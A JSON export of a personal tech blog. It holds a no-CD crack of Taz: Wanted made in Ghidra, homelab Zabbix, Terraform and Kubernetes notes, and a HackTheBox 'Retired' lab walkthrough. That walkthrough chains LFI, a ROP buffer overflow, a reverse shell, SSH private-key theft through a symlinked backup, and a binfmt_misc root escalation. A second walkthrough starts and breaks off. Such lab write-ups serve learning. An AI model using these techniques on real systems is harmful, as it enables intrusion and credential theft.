[ { "title": "Breaking 20 year old PC game copy protection", "url": "/posts/taz/", "categories": "", "tags": "Security, Reverse Engineering", "date": "2023-03-20 00:00:00 +1100", "snippet": "IntroductionAs a kid, I used to play Taz: Wanted on my PC, but nowadays it’s impossible to play these old games as most modern PCs don’t have a CD drive. While you can easily download no-CD cracks,...", "content": "IntroductionAs a kid, I used to play Taz: Wanted on my PC, but nowadays it’s impossible to play these old games as most modern PCs don’t have a CD drive. While you can easily download no-CD cracks, where the CD checks have been removed, it’s more fun to create your own no-CD patch. In this post, I’ll show you how I was able to create my own no-CD patch for Taz: Wanted.CD CheckAfter installing Taz: Wanted on my PC, I encountered a screen prompting me to insert the Taz: Wanted CD-ROM into my CD drive.AnalysisLet’s find out how this check is being performed. Quick Googling around, old forum posts mention how games would just check for a CD-ROM drive on the PC, with a disk inserted that has a string of the game as the label. We will open the Taz.exe file open in Ghidra and see if we can find out if this CD-ROM check is done the same.Once the executable is open in Ghidra, we will want to use all Analyzers and let it analyse.My first thought is, if it is just checking if there is a CD Drive on the PC, and then checks if the Label of the CD-Drive is equal to something, I should check libraries that the executable imports.Under kernel32.dll I see that GetDriveTypeA and GetVolumeInformationA are referenced in the executable, and they are only ever referenced once, is this possibly the function that checks the CD-ROM and is the “copy protection”?If I go to this reference, I can see in the decompiled view below.At first glance, I can see that GetDriveTypeA is being assigned a variable, and is then being compared to the value 5. UVar2 = GetDriveTypeA((LPCSTR)local_138);if ((UVar2 == 5)Looking at the documentation for the function GetDriveTypeA we see that a return value of 5, means the drive is a CD-ROM drive. Looks like we have where our check is done.Looking further down this function, we can see references to a string in the executable TazWanted as well as CD Found\\n. This gives us further confirmation that this is the function checking that a CD-ROM drive is present, and a CD is inserted that has the label TazWanted.If bVar8 is not 0, it then returns what looks to be a non 0 value. We can safely rename this FUN_004a1f10 to CD_CHECK. With this we can check what is actually calling CD_CHECK and see if we can just skip calling this CD-ROM function altogether. By showing all references of this CD_CHECK we can see that it’s mentioned 3 times by 1 other function FUN_004a1de0. Let’s jump to this function.We can see that it assigns uVar2 = CD_CHECK(); a variable to the returned result. It then just does a return at the end if a simple condition is met with the returned result of CD_CHECK.If we just return out of this function before the CD_CHECK does the game continue on as usual? Let’s patch this CALL CD_CHECK and change it to just a RET, then save and export this executable and replace the Taz.exe in the C:\\Program Files (x86)\\Infogrames Interactive\\TazWanted directory and test it out.Successs!The game launches to the main menu now, doesn’t prompt to enter our Taz: Wanted CD-ROM and we can now play the game!" }, { "title": "Monitoring homelab with Zabbix", "url": "/posts/linds-zabbix/", "categories": "", "tags": "zabbix, homelab", "date": "2022-11-03 00:00:00 +1100", "snippet": "IntroductionThe best way to have visbility on what is going on in your homelab is to have monitoring over everything from Networking, Storage, and Compute hosts. To do this, I have decided to use Z...", "content": "IntroductionThe best way to have visbility on what is going on in your homelab is to have monitoring over everything from Networking, Storage, and Compute hosts. To do this, I have decided to use Zabbix in HA on my Kubernetes cluster, while integrating it with my PostgreSQL HA cluster to ensure ultimate uptime of my monitoring solution.ArchitectureBelow is a simple diagram showing the physical infrastructure backing this Zabbix deployment.KubernetesTo move this to Kubernetes, ideally we would want a PostgreSQL cluster to store everything in. We can achieve this by using a PostgreSQL operator in Kubernetes, which automates provisioning StatefulSets of databases, which automates the High Availability by switching the Kubernetes service to the master node. PostgreSQL HA cluster using Zalando PostgreSQL Operator Zabbix Server in HA with LINDS-Kubernetes/zabbix TrueNAS Host to host the PostgreSQL data.Monitored objects 2x Core switches 5x Wireless AP’s Physical Host hardware (HPE and Dell) VMware ESXi Hypervisor OS 2x TrueNAS VM 2X OPNSense VMAlertingTo receive alerting, I’ve set up Discord webhooks as well as ZBX Viewer to receive any notifications on my phone if there is any alerts.ScreenshotDashboardHosts" }, { "title": "Implementing Terraform with vSphere", "url": "/posts/linds-terraform/", "categories": "", "tags": "terraform, homelab", "date": "2022-10-12 00:00:00 +1100", "snippet": "IntroductionMy entire homelab has been very adhoc, with VM’s in ESXi just created and then installed from a installer ISO. After working more with Kubernetes and AWS, seeing how nice it is to have ...", "content": "IntroductionMy entire homelab has been very adhoc, with VM’s in ESXi just created and then installed from a installer ISO. After working more with Kubernetes and AWS, seeing how nice it is to have easily reproducible infrastructure, and automate deployment/updates, I decided to implement Terraform into my vSphere infrastructure, and use Puppet to provision the VM’s to the way I want them.ToolingPackerUsing vsphere-iso, I can create a CentOS 9 VM template for me to later clone to other VM’s. Writing this in a pkr file allows me to easily rerun and create reproducible images. It just requires having the latest CentOS 9 iso present.Terraform ProviderThe vSphere Terraform Provider allows me to create, modify and destroy various resources in a vSphere environment.Utilising this I have defined my Datastores Networks More specifically VM’s on my non-cluster ESXi hosts jd-esxi and linds-esxiI imported most of these resources into the active state, then modified as need be.StateWith Terraform, you need to keep track of your state. To achieve this in reliable way, I have stored the state on a NAS that is then rsynced to an offsite NAS." }, { "title": "Moving to Kubernetes", "url": "/posts/linds-kubernetes/", "categories": "", "tags": "kubernetes, homelab", "date": "2022-07-27 00:00:00 +1000", "snippet": "IntroductionI have been running multiple Docker hosts with an assortment of containers that run random things. It was time to clean it up, define all the infrastructure, configurations, add some re...", "content": "IntroductionI have been running multiple Docker hosts with an assortment of containers that run random things. It was time to clean it up, define all the infrastructure, configurations, add some redundancy, and also allow easier upgrading/moving of the underlying OS.SetupPuppet AutomationTo automate onboarding of a VM to the kubernetes cluster, I implemented it through Puppet and my manifests can be seen in kubernetes.pp, which uses flannel as the network fabric.Current deploymentMy current deployment consists of: flannel for the networking fabric. Ingress-NGINX for setting up an ingress controller, using NGINX virtualhosts to host multiple services on a single host. CSI-SMB Driver for mounting SMB shares. My Kubernetes manifests 2 x TrueNAS hosts with 100GB storage, shared out through NFS for Physical Volumes to be created in K8s. MetalLB to share load balancing services using BGP and L2 advertisements.MetalLBMetalLB allows you to run a Kubernetes load balancer on bare metal hardware, compared to Cloud supplied load balancer.I have this running in L2 (Layer 2) and BGP (Border Gateway Protocol) to learn and expirement with BGP.From metallb.yml, I have set up the below.apiVersion: metallb.io/v1beta1kind: IPAddressPoolmetadata: name: jd-bgp-pool namespace: metallb-systemspec: addresses: - 172.16.10.1-172.16.10.254 - 172.16.11.1-172.16.11.254---apiVersion: metallb.io/v1beta1kind: BGPAdvertisementmetadata: name: jd-bgp-advertisement namespace: metallb-systemspec: ipAddressPools: - jd-bgp-pool---apiVersion: metallb.io/v1beta2kind: BGPPeermetadata: name: jd-bgp-peer namespace: metallb-systemspec: myASN: 64500 peerASN: 64550 peerAddress: 10.0.50.1IP pool to be advertised through BGP, and the BGP peer, which is my OPNSense box.To confirm that a service is being advertised, I moved my Factorio server to use the BGP IP pool.apiVersion: v1kind: Servicemetadata: name: factorio annotations: metallb.universe.tf/address-pool: jd-bgp-pool namespace: defaultspec: type: LoadBalancer externalTrafficPolicy: Local selector: app: factorio ports:...Can confirm that the factorio service is being advertised through kubectl[root@jd-kube-01 LINDS-Kube]# kubectl get service factorio --namespace default NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEfactorio LoadBalancer 10.107.11.59 172.16.10.1 34197:31812/UDP,27015:31516/TCP 10d[root@jd-kube-01 LINDS-Kube]# Now to confirm that from OPNsense we can see this external service IP 172.16.10.1 being advertised over BGP.root@JD-OPNsense-01:~ # netstat -rnRouting tablesInternet:Destination Gateway Flags Netif Expiredefault xxx.xxx.xxx.xxx UGS igb0...10.8.0.1 link#12 UH ovpnc110.8.0.6 link#12 UHS lo0127.0.0.1 link#3 UH lo0172.16.10.1 10.0.53.8 UGH1 vmx0_vla...And we can see that the factorio service is now advertised through BGP from 10.0.53.8 (JD-Kube-02), and is on the route table of OPNSense.Diagram" }, { "title": "HackTheBox - Retired", "url": "/posts/htb-retired/", "categories": "", "tags": "security, hackthebox, ctf", "date": "2022-06-22 00:00:00 +1000", "snippet": "HTB - Retired walkthroughRetired box is a medium rated difficulty box, but for me personally it was a hard box. I’ve never done any sort of binary exploitation before and because of that, this box ...", "content": "HTB - Retired walkthroughRetired box is a medium rated difficulty box, but for me personally it was a hard box. I’ve never done any sort of binary exploitation before and because of that, this box took me a good 30+ hours to solve.I overall found this really fun, and I’m glad I did this box, as I learned a lot about binary exploitation, even if it was only a specific type.InitialStart with nmap scan on the remote host: 10.10.11.154┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $nmap -sC -sV -p- 10.10.11.154Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 22:45 AESTNmap scan report for 10.10.11.154Host is up (0.015s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0)| ssh-hostkey: | 3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)| 256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)|_ 256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)80/tcp open http nginx| http-title: Agency - Start Bootstrap Theme|_Requested resource was /index.php?page=default.htmlService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.65 secondsLet’s checkout the webpage, which redirects us to http://10.10.11.154/index.php?page=default.html.This looks like a LFI (Local File Inclusion) straight away. Let’s FUZZ this and find some pages.┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $ffuf -u http://10.10.11.154/index.php?page=FUZZ.html -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 10 -fs 0 -sdefaultbetaWe can see a beta.html, which allows us to upload a license file. Intercepting the upload request through burpsuite, we can see it POST’s to activate_license.php.Now let’s try to leverage what appears to be this LFI, and grab the index.php, activate_license.php and beta.php┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $curl http://10.10.11.154/index.php?page=php://filter/resource=index.php&lt;?phpfunction sanitize_input($param) { $param1 = str_replace(\"../\",\"\",$param); $param2 = str_replace(\"./\",\"\",$param1); return $param2;}$page = $_GET['page'];if (isset($page) &amp;&amp; preg_match(\"/^[a-z]/\", $page)) { $page = sanitize_input($page);} else { header('Location: /index.php?page=default.html');}readfile($page);?&gt;┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $curl http://10.10.11.154/index.php?page=php://filter/resource=activate_license.php --output -&lt;?phpif(isset($_FILES['licensefile'])) { $license = file_get_contents($_FILES['licensefile']['tmp_name']); $license_size = $_FILES['licensefile']['size']; $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); if (!$socket) { echo \"error socket_create()\\n\"; } if (!socket_connect($socket, '127.0.0.1', 1337)) { echo \"error socket_connect()\" . socket_strerror(socket_last_error()) . \"\\n\"; } socket_write($socket, pack(\"N\", $license_size)); socket_write($socket, $license); socket_shutdown($socket); socket_close($socket);}?&gt;┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $curl http://10.10.11.154/index.php?page=php://filter/resource=/proc/self/cmdline --output -php-fpm: pool wwwWe have LFI, and can now look for other running processes by enumerating through /proc/PID/cmdline, and we can automate this through a quick python script that I wrote PID Scanner.┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $python pid_scanner.py 401/usr/bin/activate_license1337545nginx: worker process546nginx: worker process561php-fpm: pool www562php-fpm: pool wwwThe interesting process from this output, is this PID of 401 with the cmdline of /usr/bin/activate_license 1337. Let’s pull this binary down through the LFI, try to play around with it, and then open it up through Ghidra to try and understand it.┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $curl http://10.10.11.154/index.php?page=php://filter/resource=/proc/401/exe --output activate_license% Total % Received % Xferd Average Speed Time Time Time CurrentDload Upload Total Spent Left Speed100 22536 0 22536 0 0 400k 0 --:--:-- --:--:-- --:--:-- 400┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $./activate_licenseError: specify port to bind to┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $./activate_license 1337[+] starting server listening on port 1337[+] listening …Using pwntools we can check if there’s any quick and easy avenues on this particular binary. Which based on the output below, shows no easy wins.┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $pwn checksec activate_license[*] '/home/jayden/ctf/retired/activate_license' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabledWe can open this up in Ghidra and see what this binary is actually doing.The main function is just setting up the socket to listen to, which we can see in activate_license.php, as it connects to a socket on port 1337. Now lets checkout the activate_license function.Through the Ghidra screenshots we can see that in line 14 of activate_license function, it reads the first 4 bytes of this first message in the socket and updates the msglen buffer to that result.sVar2 = read(sockfd,&amp;msglen,4);Later down on line 22 it then reads the second message from this socket, and reads msglen length from the socket into the buffer BUT this buffer is only 512 char long. This will allow us to overflow later.sVar2 = read(sockfd,buffer,(ulong)msglen);By researching up on binary exploitation, John Hammonds Video explains the idea of ROP (Return Oriented Programming) really well. Our binary is different from this example, but we can use this as a basis point.What we can do is look at using this overflow to then bypass the NX (No eXecute) on the stack by calling mprotect() on the stack address space, making the stack executable. An okay example of this is Bypass NX with mprotect, but the instructions skip over some steps, and dont explain enough of the steps.But this is not enough, as we need a way to execute the stack, and that can be done with a “jmp rsp” (jump to stack pointer) and we can use the jmp rsp instructionsto execute what we put on the stack.High Level Overview:We need to get the address of mprotect on the stack, the return addresses to pop the parameters we want to use in mprotect() in the stack, so that mprotect() can then be executed to make the stack executable and then execute our code through a jmp rsp instruction.First we need to find the offset, which will allow us to cleanly put what we want on the stack. This can be seen in Bypass NX with mprotect. I can see that the offset ends up being 520 bytes (convenient 512 + 8 Bytes).Script to find offset - pwntool-test.pypwndbg&gt; Temporary breakpoint 9 at 0x555555555370: file activate_license.c, line 23.[+] reading 1000 bytes[+] activated license: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDThread 2.1 \"activate_licens\" received signal SIGSEGV, Segmentation fault.0x00005555555555c0 in activate_license (sockfd=4) at activate_license.c:6464 in activate_license.cLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────*RAX 0x260 RBX 0x0*RCX 0x0*RDX 0x7ffff7b380c0 ◂— 0x7ffff7b380c0*RDI 0x7fffffffd790 —▸ 0x7ffff7cfd090 (funlockfile) ◂— mov rdi, qword ptr [rdi + 0x88]*RSI 0x0*R8 0xfffffffffffffff7*R9 0x260*R10 0x7fffffffdd20 ◂— 0x4343434343434343 ('CCCCCCCC') R11 0x246 R12 0x555555555220 (_start) ◂— xor ebp, ebp R13 0x0 R14 0x0 R15 0x0*RBP 0x4343434343434343 ('CCCCCCCC')*RSP 0x7fffffffdf28 ◂— 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'*RIP 0x5555555555c0 (activate_license+643) ◂— ret ──────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────── ► 0x5555555555c0 &lt;activate_license+643&gt; ret &lt;0x4444444444444444&gt;──────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────00:0000│ rsp 0x7fffffffdf28 ◂— 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'... ↓ 7 skipped────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────── ► f 0 0x5555555555c0 activate_license+643 f 1 0x4444444444444444 f 2 0x4444444444444444 f 3 0x4444444444444444 f 4 0x4444444444444444 f 5 0x4444444444444444 f 6 0x4444444444444444 f 7 0x4444444444444444──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; We then just follow the same instructions as Bypass NX with mprotect but with some exceptions. We will use the libc and sqlite3 library to help us with some of the stack pops and the eventual “jmp rsp”. The likelihood that a library will have the “jmp rsp” instruction anywhere is unlikely, but luckily sqlite3 does have it.Now let’s find these stack pops, libc address and the mprotect() address.┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $gdb activate_license Reading symbols from activate_license...pwndbg&gt; set args 1337pwndbg&gt; runStarting program: /home/jayden/ctf/retired/activate_license 1337[Thread debugging using libthread_db enabled]Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".[+] starting server listening on port 1337[+] listening ...^CProgram received signal SIGINT, Interrupt.pwndbg&gt; p mprotect $1 = {&lt;text variable, no debug info&gt;} 0x7ffff7d9dc20 &lt;mprotect&gt;┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $ROPgadget --binary activate_license | grep -i \"pop rdi\"0x000000000000181b : pop rdi ; ret┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.31.so | grep -i \"pop rsi ; ret\"0x000000000002890f : pop rsi ; ret┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.31.so | grep -i \"pop rdx ; ret\"0x00000000000cb1cd : pop rdx ; ret┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $ROPgadget --binary /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 | grep -i \"jmp rsp\"0x00000000000d431d : jmp rspWe now have the offsets needed, but require the libc base address, libsqlite3 base address. We can grab this from running vmmap inside gdb when the process is running, and grab the first occurence of the loaded module, and that is the base address of this module on the local system.pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA.... 0x7ffff7ca5000 0x7ffff7cca000 r--p 25000 0 /lib/x86_64-linux-gnu/libc-2.31.so.... 0x7ffff7e6a000 0x7ffff7e7a000 r--p 10000 0 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6....pwndbg&gt; If we now execute activate_license, and run the pwntool-local.py in another terminal, then open a netcat listener shell, we will get a reverse shell back, which was executed by the activate_license binary.┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $nc -nvlp 4444Listening on 0.0.0.0 4444Connection received on 127.0.0.1 50862pwd /home/jayden/ctf/retiredSwitch back to gdbpwndbg: loaded 198 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from activate_license…pwndbg&gt; set args 1337pwndbg&gt; runStarting program: /home/jayden/ctf/retired/activate_license 1337[Thread debugging using libthread_db enabled]Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".[+] starting server listening on port 1337[+] listening …[+] accepted client connection from 0.0.0.0:0[Attaching after Thread 0x7ffff7b380c0 (LWP 7853) fork to child process 7938][New inferior 2 (process 7938)][Detaching after fork from parent process 7853][Inferior 1 (process 7853) detached][Thread debugging using libthread_db enabled]Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".[+] reading 1000 bytes[+] activated license: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�����process 7938 is executing new program: /bin/dashNow time for exploiting this on the remote machine.Since we have LFI, we can check the /proc/pid/maps to see the vmmap of the remote process, which will allow us to get the base addresses of loaded libraries, and also download those versions of the libraries (as they may be different to our local machine) and discover some ROP gadgets to chain to get our code exectution.┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $wget http://10.10.11.154/index.php?page=php://filter/resource=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 -O libsqlite3.so.0.8.6┌─[✗]─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $ROPgadget --binary libsqlite3.so.0.8.6 | grep -i \"jmp rsp\"0x00000000000d431d : jmp rspThe end result ends up being this script I wrote pwntool-remote.py.Update our reverse shell binary, point to our VPN IP, and set up a listener on port 4444, and let’s see what we get back.┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $nc -nvlp 4444Listening on 0.0.0.0 4444Connection received on 10.10.11.154 52972Upgrade to full reverse shell: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/www-data@retired:/var/www$ ls -latotal 1512drwxrwsrwx 3 www-data www-data 4096 Jun 19 10:24 .drwxr-xr-x 12 root root 4096 Mar 11 14:36 ..-rw-r--r-- 1 dev www-data 505153 Jun 19 10:22 2022-06-19_10-22-01-html.zip-rw-r--r-- 1 dev www-data 505153 Jun 19 10:23 2022-06-19_10-23-01-html.zip-rw-r--r-- 1 dev www-data 505153 Jun 19 10:24 2022-06-19_10-24-01-html.zipdrwxrwsrwx 5 www-data www-data 4096 Mar 11 14:36 html-rw-r--r-- 1 www-data www-data 12288 Jun 19 10:21 license.sqlitewww-data@retired:/var/www$ Success!We got a shell on the remote box, now let’s try to enumerate more.First thing we see is these zip files being created locally every minute. Let’s run linpeas and see if we can find anything useful.www-data@retired:/var/www$ ls -latotal 1512drwxrwsrwx 3 www-data www-data 4096 Jun 22 10:29 .drwxr-xr-x 12 root root 4096 Mar 11 14:36 ..-rw-r--r-- 1 dev www-data 505153 Jun 22 10:27 2022-06-22_10-27-01-html.zip-rw-r--r-- 1 dev www-data 505153 Jun 22 10:28 2022-06-22_10-28-08-html.zip-rw-r--r-- 1 dev www-data 505153 Jun 22 10:29 2022-06-22_10-29-02-html.zipdrwxrwsrwx 5 www-data www-data 4096 Mar 11 14:36 html-rw-r--r-- 1 www-data www-data 12288 Jun 22 10:29 license.sqlitewww-data@retired:/var/www$ wget http://10.10.14.30/linpeas.sh--2022-06-22 10:34:54-- http://10.10.14.30/linpeas.shConnecting to 10.10.14.30:80... connected.HTTP request sent, awaiting response... 200 OKLength: 776776 (759K) [text/x-sh]Saving to: ‘linpeas.sh’linpeas.sh 100%[===================&gt;] 758.57K 2.49MB/s in 0.3s 2022-06-22 10:34:54 (2.49 MB/s) - ‘linpeas.sh’ saved [776776/776776]www-data@retired:/var/www$ chmod +x linpeas.sh www-data@retired:/var/www$ ./linpeas.sh ╔══════════╣ Backup files (limited 100)-rwxr-xr-x 1 root root 485 Oct 13 2021 /usr/bin/webbackupWe find an interesting file, looks like a the shell script that is outputting those files into /var/www/. And since these zip files are owned by user “dev” we can assume it’s running under the “dev” user. So let’s try and see if dev has a private SSH key.www-data@retired:/var/www$ cat /usr/bin/webbackup #!/bin/bashset -euf -o pipefailcd /var/www/SRC=/var/www/htmlDST=\"/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip\"/usr/bin/rm --force -- \"$DST\"/usr/bin/zip --recurse-paths \"$DST\" \"$SRC\"KEEP=10/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \\ | sort --zero-terminated --numeric-sort --reverse \\ | while IFS= read -r -d '' backup; do if [ \"$KEEP\" -le 0 ]; then /usr/bin/rm --force -- \"$backup\" fi KEEP=\"$((KEEP-1))\" donewww-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa .┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $wget http://10.10.11.154/index.php?page=php://filter/resource=/var/www/2022-06-19_12-28-01-html.zip -O html.zip┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $unzip html.zipArchive: html.zip inflating: var/www/html/id_rsa┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $cat var/www/html/id_rsa-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEA58qqrW05/urHKCqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN/yf┌─[jayden@JD-Desktop]─[~/ctf/retired]└──╼ $ssh -i id_rsa dev@10.10.11.154Linux retired 5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Mon Mar 28 11:36:17 2022 from 10.10.14.23dev@retired:~$ cat user.txt554c6e854251a377cdc59e4b4d6f2cdedev@retired:~$User Owned!Now let’s have a look at root. Let’s run linpeas again as the dev user and see if we can find anything.dev@retired:/var/www$ /var/www/linpeas.sh ╔══════════╣ Readable files belonging to root and readable by me but not world readable-rwxr-x--- 1 root dev 16864 Oct 13 2021 /usr/lib/emuemu/reg_helper-rw-r----- 1 root dev 33 Jun 22 04:27 /home/dev/user.txtdev@retired:~$ ls -la /usr/lib/emuemu/reg_helper -rwxr-x--- 1 root dev 16864 Oct 13 2021 /usr/lib/emuemu/reg_helperThis reg_helper binary is interesting, let’s browse around in the “dev” users home directory. Looks like reg_helper is binary that was written/compiled on this box and we can see the source code.dev@retired:~$ ls -la /home/dev/emuemu/total 68drwx------ 3 dev dev 4096 Mar 11 14:36 .drwx------ 6 dev dev 4096 Mar 11 14:36 ..-rw------- 1 dev dev 673 Oct 13 2021 Makefile-rw------- 1 dev dev 228 Oct 13 2021 README.md-rw------- 1 dev dev 16608 Oct 13 2021 emuemu-rw------- 1 dev dev 168 Oct 13 2021 emuemu.c-rw------- 1 dev dev 16864 Oct 13 2021 reg_helper-rw------- 1 dev dev 502 Oct 13 2021 reg_helper.cdrwx------ 2 dev dev 4096 Mar 11 14:36 testdev@retired:~/emuemu$ cat reg_helper.c #define _GNU_SOURCE#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main(void) { char cmd[512] = { 0 }; read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0; int fd = open(\"/proc/sys/fs/binfmt_misc/register\", O_WRONLY); if (-1 == fd) perror(\"open\"); if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1) perror(\"write\"); if (close(fd) == -1) perror(\"close\"); return 0;}dev@retired:~/emuemu$ We can see what looks like this binfmt_misc, which will allow us to priv esc to root. Running this payload directly on the box fails, as we don’t have direct write access to “/proc/sys/fs/binfmt_misc/register”, but we do through “reg_helper”, which can be seen below, as the error it’s failing on is the write command.dev@retired:~$ /usr/lib/emuemu/reg_helper fdafdsafdsafwrite: Invalid argumentdev@retired:~$ All we need to do, is pass the binfmt line to the reg_helper STDIN and we will get a root shell!Using exploit.sh we can get a root shell.dev@retired:~$ vi exploit.shdev@retired:~$ chmod +x ./exploit.sh dev@retired:~$ ./exploit.sh uid=0(root) euid=0(root)# whoamiroot# cat root.txtcat: root.txt: No such file or directory# cat /root/root.txtc8a25a84ec484df4652a44291fa86c1a# Root owned!" }, { "title": "HackTheBox - OpenSource", "url": "/posts/htb-opensource/", "categories": "", "tags": "security, hackthebox, ctf", "date": "2022-06-01 00:00:00 +1000", "snippet": "HTB - OpenSource walkthroughOpenSource was a harder than initially thought box, I got lost in some rabbit holes, such as escaping the docker container, the Werkzueg console etc. Even though this bo...", "content": "HTB - OpenSource walkthroughOpenSource was a harder than initially thought box, I got lost in some rabbit holes, such as escaping the docker container, the Werkzueg console etc. Even though this box is rated as an \"Easy\" box I would say this was more of a Medium box, as the previous box, Noter was more simpler than this.InitialLet's start with a quick NMAP scan┌─[jayden@JD-Desktop]─[~/ctf/openssource]└──╼ $nmap -sC -sV -p- -oA openssource 10.10.11.164Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 21:11 AESTNmap scan report for 10.10.11.164Host is up (0.015s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 